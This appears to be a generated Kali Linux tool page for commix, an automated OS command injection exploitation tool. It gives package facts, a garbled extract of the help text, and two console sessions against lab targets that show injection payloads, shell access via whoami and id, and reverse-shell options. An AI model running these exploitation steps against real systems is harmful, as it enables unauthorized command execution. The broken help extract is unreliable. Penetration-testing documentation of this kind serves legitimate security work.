---
tool_id: commix
title: commix
categories: ["exploitation-tools", "web-application-analysis", "vulnerability-analysis"]
category_slugs: ["exploitation-tools", "web-application-analysis", "vulnerability-analysis"]
homepage: https://commixproject.com
repository: 
version: 4.0-0kali1
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-web"]
icon: images/commix-logo.svg
source_path: kali-tools\commix\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.850917
---

# Tool: commix (commix)

## Categories
- [exploitation-tools](../exploitation-tools.md)
- [web-application-analysis](../web-application-analysis.md)
- [vulnerability-analysis](../vulnerability-analysis.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://commixproject.com](https://commixproject.com) |
| Repository |  |
| Version | 4.0-0kali1 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-web |
| Icon | images/commix-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/commix
- **PackagesInfo**: |
- ****Installed size**: ** `1.05 MB`
- ****How to install**: ** `sudo apt install commix`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# commix -h
- **Usage**: commix [option(s)]
- **Options**: []
- **General**: []
- **-v VERBOSE          Verbosity level (0-4, Default**: 0).
- **Target**: []
- **(Default**: 1).
- **Request**: []
- **-H HEADER, --hea..  Extra header (e.g. 'X-Forwarded-For**: 127.0.0.1').
- **--headers=HEADERS   Extra headers (e.g. 'Accept-Language**: fr\nETag: 123').
- **--tor-port=TOR_P..  Set Tor proxy port (Default**: 8118).
- **--auth-cred=AUTH..  HTTP authentication credentials (e.g. 'admin**: admin').
- **--timeout=TIMEOUT   Seconds to wait before timeout connection (Default**: []
- **--retries=RETRIES   Retries when the connection timeouts (Default**: 3).
- **Enumeration**: []
- **File access**: []
- **Modules**: []
- **Injection**: []
- **injection techniques (Default**: 10000 chars).
- **Detection**: []
- **--level=LEVEL       Level of tests to perform (1-3, Default**: 1).
- **Miscellaneous**: []


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## Commix Usage Example

```console
root@kali:~# commix --url http://192.168.20.12/dvwa/vulnerabilities/exec/ \
>   --cookie='PHPSESSID=cj645co26lgve7ro1kc9dvt3a0; security=low' \
>   --data='ip=INJECT_HERE&Submit=Submit'
                                       __
   ___    ___     ___ ___     ___ ___ /\_\   __  _
  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\
 /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
 \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\
  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ { v0.3b-nongit-20160104 }

+--
Automated All-in-One OS Command Injection and Exploitation Tool
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst)
+--

(*) Checking connection to the target URL... [ SUCCEED ]
(^) Warning: Heuristics have failed to identify server's operating system.
(?) Do you recognise the server's operating system? [(W)indows/(U)nix/(q)uit] > w
(*) Setting the (POST) 'ip' parameter for tests.
(^) Warning: Due to the relatively slow response of 'cmd.exe' there may be delays during the data extraction procedure.
(*) Testing the classic injection technique... [ SUCCEED ]
(!) The (POST) 'ip' parameter is vulnerable to Results-based Command Injection.
  (+) Type : Results-based Command Injection
  (+) Technique : Classic Injection Technique
  (+) Payload : %26 for /f "delims=" %i in ('cmd /c "set /a (49+1)"') do @set /p = AWMZVA%iAWMZVAAWMZVA <nul

(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > y

Pseudo-Terminal (type '?' for available options)
commix(os_shell) > whoami

nt authority\iusr

commix(os_shell) >
```

Attempt to exploit a site (`–url=”http://192.168.0.23/commix-testbed/scenarios/referer/referer(classic).php”`) using the highest testing level (`–level=3`):

```console
root@kali:~# commix --url="http://192.168.0.23/commix-testbed/scenarios/referer/referer(classic).php" --level=3
                                       __
   ___    ___     ___ ___     ___ ___ /\_\   __  _
  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v1.7-stable
 /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
 \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ http://commixproject.com
  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection and Exploitation Tool
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst)
+--

[*] Checking connection to the target URL... [ SUCCEED ]
[*] Setting the HTTP header User-Agent for tests.
[*] Testing the (results-based) classic command injection technique... [ FAILED ]
[*] Testing the (results-based) dynamic code evaluation technique... [ FAILED ]
[*] Testing the (blind) time-based command injection technique... [ FAILED ]
[*] Trying to create a file in '/var/www/html/commix-testbed/scenarios/referer/'...
[!] Warning: It seems that you don't have permissions to read and/or write files in '/var/www/html/commix-testbed/scenarios/referer/'.
[?] Do you want to try the temporary directory (/tmp/) [Y/n] > Y
[*] Trying to create a file, in temporary directory (/tmp/)...
[*] Testing the (semi-blind) tempfile-based injection technique... [ FAILED ]
[!] Warning: The tested HTTP header User-Agent seems to be not injectable.
[*] Setting the HTTP header Referer for tests.
[*] Testing the (results-based) classic command injection technique... [ SUCCEED ]
[+] The HTTP header Referer seems injectable via (results-based) classic command injection technique.
    [~] Payload: ';echo KSXTLU$((18+64))$(echo KSXTLU)KSXTLU'

[?] Do you want a Pseudo-Terminal shell? [Y/n] > Y

Pseudo-Terminal (type '?' for available options)
commix(os_shell) > ?

  ---[ Available options ]---
  Type '?' to get all the available options.
  Type 'back' to move back from the current context.
  Type 'quit' (or use <Ctrl-C>) to quit commix.
  Type 'reverse_tcp' to get a reverse TCP connection.
  Type 'bind_tcp' to set a bind TCP connection.

commix(os_shell) > id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

commix(os_shell) > ls

index.html referer(blind).php referer(classic).php referer(eval).php

commix(os_shell) > quit

root@kali:~#
```

## Video

<script type="text/javascript" src="https://asciinema.org/a/105988.js" id="asciicast-105988" async></script>


## Source
- Path: kali-tools\commix\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.850917
